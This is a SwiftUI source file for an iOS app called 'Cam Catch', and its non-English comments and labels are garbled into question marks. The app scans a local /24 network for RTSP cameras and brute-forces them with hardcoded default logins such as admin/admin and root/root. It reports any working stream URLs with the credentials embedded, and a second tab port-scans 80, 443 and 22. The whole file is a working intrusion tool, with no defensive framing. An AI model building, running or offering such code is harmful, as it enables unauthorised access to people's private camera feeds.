import SwiftUI
import Network

struct Credential { let user: String; let pass: String }

class NetworkTool: ObservableObject {
    @Published var logs: String = ""
    @Published var isScanning: Bool = false
    private var credentials: [Credential] = []
    
    init() {
        // ????? ????? ??????? ???????. ? ?????? ?????? ?? Bundle
        credentials = [Credential(user: "admin", pass: "admin"), Credential(user: "admin", pass: "12345"), Credential(user: "root", pass: "root")]
    }
    
    func log(_ text: String) { DispatchQueue.main.async { self.logs += text + "\n" } }
    func clearLogs() { logs = "" }
    
    func startScan(ipRange: String, mode: String) {
        isScanning = true; clearLogs()
        Task {
            log("[*] ?????? ??????: \(mode) ?? ??????? \(ipRange).0/24")
            for i in 1...254 {
                let ip = "\(ipRange).\(i)"
                await checkHost(ip: ip, mode: mode)
            }
            DispatchQueue.main.async { self.isScanning = false; self.log("[*] ???????????? ?????????.") }
        }
    }
    
    func checkHost(ip: String, mode: String) async {
        if mode == "??????" {
            let rtspOpen = await checkPort(host: ip, port: 554)
            if rtspOpen {
                log("[+] \(ip) RTSP ??????. ????????...")
                await bruteRTSP(ip: ip)
            }
        } else if mode == "?????" {
            let p80 = await checkPort(host: ip, port: 80)
            let p443 = await checkPort(host: ip, port: 443)
            let p22 = await checkPort(host: ip, port: 22)
            if p80 || p443 || p22 {
                log("[+] \(ip) ???????. 80:\(p80) 443:\(p443) 22:\(p22)")
            }
        }
    }
    
    func checkPort(host: String, port: UInt16) async -> Bool {
        return await withCheckedContinuation { cont in
            let conn = NWConnection(host: NWEndpoint.Host(host), port: NWEndpoint.Port(rawValue: port)!, using: .tcp)
            var hasResumed = false
            conn.stateUpdateHandler = { state in
                if case .ready = state, !hasResumed { hasResumed = true; cont.resume(returning: true); conn.cancel() }
                else if case .failed = state, !hasResumed { hasResumed = true; cont.resume(returning: false) }
            }
            conn.start(queue: .global())
            DispatchQueue.global().asyncAfter(deadline: .now() + 0.5) {
                if !hasResumed { hasResumed = true; conn.cancel(); cont.resume(returning: false) }
            }
        }
    }
    
    func bruteRTSP(ip: String) async {
        for cred in credentials {
            let found = await tryRTSP(ip: ip, user: cred.user, pass: cred.pass)
            if let url = found { log("[!!!] ?????: \(url)"); return }
        }
        log("[-] \(ip) ?????? ?? ??????.")
    }
    
    func tryRTSP(ip: String, user: String, pass: String) async -> String? {
        return await withCheckedContinuation { cont in
            let conn = NWConnection(host: NWEndpoint.Host(ip), port: 554, using: .tcp)
            var hasResumed = false
            let auth = "\(user):\(pass)".data(using: .utf8)!.base64EncodedString()
            let req = "DESCRIBE rtsp://\(ip):554/ RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic \(auth)\r\n\r\n"
            conn.stateUpdateHandler = { state in
                if case .ready = state {
                    conn.send(content: req.data(using: .utf8), completion: .contentProcessed({ _ in
                        conn.receive(minimumIncompleteLength: 1, maximumLength: 1024) { data, _, _, _ in
                            if let data = data, let str = String(data: data, encoding: .utf8), str.contains("200 OK") {
                                if !hasResumed { hasResumed = true; cont.resume(returning: "rtsp://\(user):\(pass)@\(ip)"); conn.cancel(); return }
                            }
                            if !hasResumed { hasResumed = true; conn.cancel(); cont.resume(returning: nil) }
                        }
                    }))
                }
            }
            conn.start(queue: .global())
            DispatchQueue.global().asyncAfter(deadline: .now() + 1.0) {
                if !hasResumed { hasResumed = true; conn.cancel(); cont.resume(returning: nil) }
            }
        }
    }
}

struct ContentView: View {
    @StateObject private var tool = NetworkTool()
    @State private var ipRange: String = "192.168.1"
    
    var body: some View {
        TabView {
            // ??????? 1: ??????
            NavigationView {
                VStack {
                    HStack {
                        TextField("??????? (192.168.1)", text: $ipRange)
                            .textFieldStyle(RoundedBorderTextFieldStyle()).keyboardType(.numbersAndPunctuation)
                        Button("Scan") { tool.startScan(ipRange: ipRange, mode: "??????") }
                            .disabled(tool.isScanning).buttonStyle(.borderedProminent)
                    }.padding()
                    ScrollView { Text(tool.logs).font(.system(.footnote, design: .monospaced)).padding() }
                }.navigationTitle("Cam Catch")
            }.tabItem { Label("??????", systemImage: "camera") }
            
            // ??????? 2: ?????
            NavigationView {
                VStack {
                    HStack {
                        TextField("???????", text: $ipRange)
                            .textFieldStyle(RoundedBorderTextFieldStyle()).keyboardType(.numbersAndPunctuation)
                        Button("Scan") { tool.startScan(ipRange: ipRange, mode: "?????") }
                            .disabled(tool.isScanning).buttonStyle(.borderedProminent)
                    }.padding()
                    ScrollView { Text(tool.logs).font(.system(.footnote, design: .monospaced)).padding() }
                }.navigationTitle("Port Scanner")
            }.tabItem { Label("?????", systemImage: "network") }
            
            // ??????? 3: Wi-Fi (???????? ??-?? ??????????? iOS)
            NavigationView {
                VStack(spacing: 20) {
                    Image(systemName: "wifi.slash").font(.largeTitle).foregroundColor(.red)
                    Text("Wi-Fi ???????? ? ???????? ??????????.")
                    Text("iOS ????????? ?????? ?????? ? Wi-Fi ????. ??? ???? ??????? ????? Android ? Root ??? ??????? ??????? (??? ?? Flipper Zero).").multilineTextAlignment(.center).padding()
                }.navigationTitle("Wi-Fi ??????")
            }.tabItem { Label("Wi-Fi", systemImage: "wifi") }
        }
    }
}
